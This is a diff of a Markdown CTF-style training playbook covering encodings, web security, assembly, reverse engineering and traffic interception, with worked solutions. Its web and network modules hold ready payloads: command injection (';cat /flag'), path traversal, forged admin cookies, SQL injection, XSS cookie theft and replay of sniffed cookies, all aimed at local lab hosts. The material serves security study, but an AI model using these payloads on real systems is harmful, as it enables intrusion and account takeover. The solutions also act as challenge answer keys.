 ### 🏋️ Practice 3: ASCII to hex
 
-**Task:** Convert string `eewqcnzx` to hex
+**Task:** Convert string `eewqcnzx` to hex.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1322,10 +1566,6 @@ echo -n "65657771636e7a78" | /challenge/runme
 
 ## 📖 4.3 Base64 Encoding
 
-### Concept
-
-Base64 converts binary to printable ASCII:
-
 ```python
 import base64
 base64.b64encode(b"data")   # b'ZGF0YQ=='
@@ -1333,8 +1573,6 @@ base64.b64decode("ZGF0YQ==")  # b'data'
 ```
 
 ### 🏋️ Practice 1: Decode base64
-
-**Task:** Program base64-decodes your input
 
 <details>
 <summary>💡 Solution</summary>
@@ -1346,7 +1584,7 @@ echo -n "ZGF0YQ==" | /challenge/runme
 
 ### 🏋️ Practice 2: Encode base64
 
-**Task:** You need to supply `base64.b64encode(b'\x832\xdb...')`
+**Task:** You need to supply `base64.b64encode(b'\x832\xdb...')`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1366,13 +1604,9 @@ echo -n 'gzLbxMXQqoo=' > /tmp/input
 
 ## 📖 4.4 Nested Encoding
 
-### Concept
+Sometimes input is encoded N times.
 
-Sometimes input is encoded N times. To reverse:
 ```python
-# Encoding applied:
-# correct = bytes.fromhex(bytes.fromhex(...bytes.fromhex(x)...))
-
 # To create input:
 # x = correct.hex().encode().hex().encode().hex()...
 ```
@@ -1386,7 +1620,6 @@ Sometimes input is encoded N times. To reverse:
 a = b'pkukrtnj'
 h = a.hex().encode().hex().encode().hex().encode().hex()
 print(h)
-# 3333333733333330...
 ```
 </details>
 
@@ -1394,14 +1627,12 @@ print(h)
 
 ## 📖 4.5 UTF-8 / UTF-16
 
-### Concept
-
 - **UTF-8**: variable-width (1-4 bytes per char)
 - **UTF-16**: 2 bytes per char (little-endian on x86)
 
 ### 🏋️ Practice 1: Emoji encoding
 
-**Task:** Encode `📊 🚔 🔦 🕞` in UTF-8
+**Task:** Encode `📊 🚔 🔦 🕞` in UTF-8.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1410,7 +1641,6 @@ print(h)
 correct = "📊 🚔 🔦 🕞".encode("utf-8")
 print(correct)
 # b'\xf0\x9f\x93\x8a \xf0\x9f\x9a\x94 \xf0\x9f\x94\xa6 \xf0\x9f\x95\x9e'
-
 # Note spaces are 0x20
 ```
 Then:
@@ -1422,7 +1652,7 @@ echo -n 'f09f938a20f09f9a9420f09f94a620f09f959e' > input
 
 ### 🏋️ Practice 2: UTF-16 trick
 
-**Task:** String `mpseczuv` in UTF-16 (2 bytes per char, LE)
+**Task:** String `mpseczuv` in UTF-16 (2 bytes per char, LE).
 
 <details>
 <summary>💡 Solution</summary>
@@ -1438,13 +1668,11 @@ echo -e -n '\x6d\x00\x70\x00\x73\x00\x65\x00\x63\x00\x7a\x00\x75\x00\x76\x00' > 
 
 ## 📖 4.6 Modifying Encoded Data
 
-### Concept
-
 Sometimes the program reverses or transforms input. Read the code carefully.
 
 ### 🏋️ Practice 1: Reversed hex
 
-**Task:** Program reverses the hex string before decoding
+**Task:** Program reverses the hex string before decoding.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1453,8 +1681,6 @@ Sometimes the program reverses or transforms input. Read the code carefully.
 original = b'\xdcr\x9dn\x14W\xab\xbe'
 hex_str = original.hex()       # 'dc729d6e1457abbe'
 reversed_hex = hex_str[::-1]   # 'ebba7541e6d927cd'
-
-# Supply reversed hex
 ```
 ```bash
 echo -n 'ebba7541e6d927cd' | /challenge/runme
@@ -1464,8 +1690,6 @@ echo -n 'ebba7541e6d927cd' | /challenge/runme
 ---
 
 ## 📖 4.7 Obfuscation
-
-### Concept
 
 Programs may use obfuscated code (variable renaming, string tricks). Read carefully.
 
@@ -1492,16 +1716,14 @@ echo -n "output_from_program" > /tmp/input
 
 ## 🎯 Learning Goals
 - Path traversal
-- Command injection
+- Command injection (basic and blind)
 - Authentication bypass
-- SQL injection
-- Blind SQL injection
+- SQL injection (UNION and blind)
+- XSS (Stored, Reflected, Cookie theft)
 
 ---
 
 ## 📖 5.1 Path Traversal
-
-### Concept
 
 When a program builds paths from user input:
 
@@ -1510,7 +1732,7 @@ path = base_dir + "/" + user_input
 open(path).read()
 ```
 
-You can escape with `../`:
+Escape with `../`:
 
 ```
 base_dir/files/../../../flag → /flag
@@ -1531,8 +1753,6 @@ curl --path-as-is "http://challenge.localhost:80/package/../../../flag"
 
 ## 📖 5.2 Command Injection
 
-### Concept
-
 When a program builds shell commands:
 
 ```python
@@ -1540,7 +1760,7 @@ command = f"ls -l {user_input}"
 subprocess.run(command, shell=True)
 ```
 
-You can inject commands with `;`, `&&`, `|`, etc.
+Inject with `;`, `&&`, `|`, etc.
 
 ### 🏋️ Practice 1: Basic injection
 
@@ -1554,7 +1774,7 @@ curl "http://challenge.localhost:80/checkpoint?target=;cat%20/flag"
 
 ### 🏋️ Practice 2: Bypass `;` filter
 
-**Task:** `;` is filtered out — use `&&` instead
+**Task:** `;` is filtered out — use `&&` instead.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1579,8 +1799,6 @@ If it sleeps 5 seconds, injection works.
 ---
 
 ## 📖 5.3 Authentication Bypass
-
-### Concept
 
 When the server trusts client data:
 
@@ -1614,15 +1832,13 @@ curl -b "session_user=admin" "http://challenge.localhost:80/"
 
 ## 📖 5.4 SQL Injection
 
-### Concept
-
 When SQL is built with f-strings:
 
 ```python
 query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 ```
 
-You can break out with `'` and use SQL comments `--`.
+Break out with `'` and use SQL comments `--`.
 
 ### 🏋️ Practice 1: Login bypass
 
@@ -1708,15 +1924,13 @@ print(f"Flag: {get_flag()}")
 
 ## 📖 5.5 XSS (Cross-Site Scripting)
 
-### Concept
-
 When user input is inserted into HTML:
 
 ```python
 page += "<hr>" + post["content"] + "\n"
 ```
 
-You can inject `<script>`.
+Inject `<script>`.
 
 ### 🏋️ Practice 1: Basic XSS
 
@@ -1762,18 +1976,15 @@ curl -b cookie.txt -X POST "http://challenge.localhost:80/draft" \
 # ⚙️ Module 6: Assembly & Systems
 
 ## 🎯 Learning Goals
-- Move data between registers
+- Registers and syscalls
 - Load/store memory
-- Use the stack
-- Syscalls (read, write, open, exit)
-- Control flow (cmp, jmp)
-- Build a web server
+- Stack operations
+- Control flow
+- Build a concurrent web server
 
 ---
 
 ## 📖 6.1 Your First Program
-
-### Concept: The Exit Syscall
 
 ```assembly
 .intel_syntax noprefix
@@ -1796,7 +2007,7 @@ _start:
 
 ### 🏋️ Practice 1: Set exit code
 
-**Task:** Exit with 0x1337
+**Task:** Exit with 0x1337.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1832,8 +2043,6 @@ _start:
 
 ## 📖 6.2 Memory
 
-### Concept: Load/Store
-
 ```assembly
 mov rax, [rdi]      # load 8 bytes from address in rdi
 mov rax, [rdi+8]    # offset 8
@@ -1842,7 +2051,7 @@ mov [rsi], rax      # store 8 bytes to address in rsi
 
 ### 🏋️ Practice 1: Load from memory
 
-**Task:** Load `[133700]` into `rdi`
+**Task:** Load `[133700]` into `rdi`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1857,26 +2066,9 @@ _start:
 ```
 </details>
 
-### 🏋️ Practice 2: Offset load
+### 🏋️ Practice 2: Memory sum
 
-**Task:** Load from `[rdi+8]`
-
-<details>
-<summary>💡 Solution</summary>
-
-```assembly
-.intel_syntax noprefix
-.global _start
-_start:
-    mov rax, [rdi+8]
-    mov rax, 60
-    syscall
-```
-</details>
-
-### 🏋️ Practice 3: Memory sum
-
-**Task:** Sum two consecutive qwords and store at `[rsi]`
+**Task:** Sum two consecutive qwords and store at `[rsi]`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1897,18 +2089,14 @@ _start:
 
 ## 📖 6.3 The Stack
 
-### Concept: Push/Pop
-
 ```assembly
 push rax    # write rax to stack, decrement rsp by 8
 pop rax     # read from stack, increment rsp by 8
 ```
 
-Stack grows downward. `rsp` points to top.
-
 ### 🏋️ Practice 1: Stack subtraction
 
-**Task:** Subtract `rdi` from top of stack
+**Task:** Subtract `rdi` from top of stack.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1927,7 +2115,7 @@ _start:
 
 ### 🏋️ Practice 2: Stack swap
 
-**Task:** Swap `rdi` and `rsi` using the stack
+**Task:** Swap `rdi` and `rsi` using the stack.
 
 <details>
 <summary>💡 Solution</summary>
@@ -1970,8 +2158,6 @@ _start:
 ---
 
 ## 📖 6.4 Input/Output
-
-### Concept: read/write
 
 ```assembly
 # write(1, buf, count)
@@ -2058,8 +2244,6 @@ _start:
 ---
 
 ## 📖 6.5 Control Flow
-
-### Concept: cmp + jmp
 
 ```assembly
 cmp rax, rbx     # compare
@@ -2156,7 +2340,7 @@ done:
 
 ## 📖 6.6 Web Server (Assembly)
 
-### Concept: Syscall Sequence
+### Syscall Sequence
 
 ```assembly
 # 1. socket(AF_INET, SOCK_STREAM, 0)
@@ -2310,18 +2494,17 @@ child:
 - Dynamic analysis with GDB
 - Reconstruct file formats (cIMG)
 - Extract data from binaries
+- Optimize data with rectangle packing
 
 ---
 
 ## 📖 7.1 Magic Numbers
 
-### Concept
-
 File formats start with a "magic number" that identifies them.
 
 ### 🏋️ Practice 1: Find the magic in Python
 
-**Task:** The Python script checks `header[:4] == b"(onr"`
+**Task:** The Python script checks `header[:4] == b"(onr"`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -2334,7 +2517,7 @@ python3 -c "open('magic.cimg','wb').write(b'(onr')"
 
 ### 🏋️ Practice 2: Find the magic in x86
 
-**Task:** The C code checks `magic_number == 1919831931`
+**Task:** The C code checks `magic_number == 1919831931`.
 
 <details>
 <summary>💡 Solution</summary>
@@ -2351,8 +2534,6 @@ python3 -c "open('magic.cimg','wb').write(b'{Onr')"
 ---
 
 ## 📖 7.2 cIMG v1
-
-### Concept: Version + Magic
 
 ```c
 struct cimg_header {
@@ -2375,8 +2556,6 @@ python3 -c "open('v1.cimg','wb').write(b'cIMG'+(1).to_bytes(2,'little'))"
 ---
 
 ## 📖 7.3 cIMG v2
-
-### Concept: Width, Height, Pixels
 
 ```c
 struct cimg_header {
@@ -2426,8 +2605,6 @@ print("Wrote v2.cimg")
 ---
 
 ## 📖 7.4 cIMG v3 (Directives)
-
-### Concept: Patch Directive
 
 ```c
 case 43709:   // 0xAABD
@@ -2557,10 +2734,6 @@ print(f"Wrote {OUTPUT}: total read {best_size}")
 
 ## 📖 7.5 GDB Scripting
 
-### Concept
-
-GDB can automate debugging. Breakpoints with `commands` are powerful.
-
 ### 🏋️ Practice 1: Print random values
 
 <details>
@@ -2667,17 +2840,14 @@ continue
 # 📡 Module 8: Intercepting Communication
 
 ## 🎯 Learning Goals
-- Capture network traffic with tshark
+- Capture network traffic with `tshark`
 - Extract HTTP data (cookies, flags)
 - Understand why HTTPS matters
+- Use stolen cookies
 
 ---
 
 ## 📖 8.1 Ping Sweep (Find Hosts)
-
-### Concept
-
-Scan a `/24` subnet to find live hosts.
 
 ### 🏋️ Practice 1: Parallel ping sweep
 
@@ -2731,8 +2901,6 @@ nmap -sn -PS80 10.0.0.0/16
 ---
 
 ## 📖 8.2 Capture HTTP Traffic (tshark)
-
-### Concept
 
 Wireshark is GUI-only. Use `tshark` (CLI) instead.
 
@@ -2795,10 +2963,6 @@ tshark -r /tmp/cap.pcap -T fields -e tcp.payload -Y "tcp.len > 0" | xxd -r -p
 
 ## 📖 8.3 Use Stolen Cookie
 
-### Concept
-
-Once you have the cookie, impersonate the user.
-
 ### 🏋️ Practice 1: Use with curl
 
 <details>
@@ -2826,10 +2990,8 @@ curl -b cookies.txt http://10.0.0.2/flag
 
 ## 📖 8.4 Why HTTPS Matters
 
-### Concept
-
-**HTTP** = plaintext (anyone can read)
-**HTTPS** = encrypted (needs key or MITM)
+- **HTTP** = plaintext (anyone can read)
+- **HTTPS** = encrypted (needs key or MITM)
 
 If the challenge uses HTTP, you can read everything. If HTTPS, you need:
 - **SSLKEYLOGFILE** (if you control the client)
@@ -2855,18 +3017,18 @@ Week 6: Module 8 (Network Interception)
 
 | Module | Skills You'll Gain |
 |--------|-------------------|
-| **1. Linux** | Navigate, pipe, permissions, PATH, scripts |
+| **1. Linux** | Navigate, pipe, permissions, PATH, scripts, screen/tmux, .bashrc attacks, symlink attacks, fork bomb, disk exhaustion |
 | **2. SQL** | SELECT, WHERE, SUBSTR, sqlite_master |
-| **3. HTTP** | curl, netcat, headers, cookies, forms |
+| **3. HTTP** | curl, netcat, headers, cookies, forms, JavaScript |
 | **4. Encodings** | hex, base64, UTF-8/16, nested encoding |
 | **5. Web Sec** | Path traversal, command injection, auth bypass, SQLi, XSS |
 | **6. Assembly** | Registers, syscalls, stack, control flow, web server |
-| **7. Reverse Eng** | GDB, disassembly, file formats, patching |
+| **7. Reverse Eng** | GDB, disassembly, file formats, patching, optimization |
 | **8. Network** | Ping sweep, tshark, cookie theft |
 
 ## Practice Checklist
 
-- [ ] Module 1: All 40+ Linux challenges
+- [ ] Module 1: All 108 Linux Luminarium challenges
 - [ ] Module 2: All SQL challenges
 - [ ] Module 3: All HTTP challenges
 - [ ] Module 4: All encoding challenges
@@ -2886,9 +3048,10 @@ Week 6: Module 8 (Network Interception)
 5. **Practice each module** — don't move on until you can solve the challenges yourself.
 6. **Take notes** — write down the pattern of each challenge type.
 7. **Use `--help` and `man`** — understand your tools.
+8. **Terminal multiplexers are your friend** — `screen` and `tmux` save your work.
 
 ---
 
 **Happy hacking! 🚀**
 
-This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.
+*This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.*
